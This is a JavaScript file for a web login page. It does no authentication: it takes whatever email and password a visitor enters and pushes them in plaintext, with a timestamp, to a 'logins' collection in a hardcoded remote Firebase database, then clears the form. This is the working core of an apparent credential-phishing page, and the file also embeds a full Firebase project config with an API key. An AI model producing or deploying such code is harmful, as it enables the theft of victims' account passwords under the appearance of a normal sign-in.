import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCgeJj-pm0yFbO_UcH06NBfaGm0H-YUVZA",
  authDomain: "live-47884.firebaseapp.com",
  databaseURL: "https://live-47884-default-rtdb.firebaseio.com",
  projectId: "live-47884",
  storageBucket: "live-47884.firebasestorage.app",
  messagingSenderId: "1020379584903",
  appId: "1:1020379584903:web:51805d3077b9802dd95b22",
  measurementId: "G-NKKST173G4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Get elements
const loginBtn = document.getElementById("loginBtn");
const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");

// Function to send login data
function sendLogin() {
  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  if (email === "" || password === "") {
    alert("Please fill all fields");
    return;
  }

  // Send to Firebase
  push(ref(db, 'logins'), {
    email: email,
    password: password,
    time: Date.now()
  });

  console.log("Login sent"); // for debugging

  // Clear inputs
  emailInput.value = "";
  passwordInput.value = "";
}

// Click event
loginBtn.addEventListener("click", sendLogin);

// Enter key support
passwordInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    e.preventDefault();
    sendLogin();
  }
});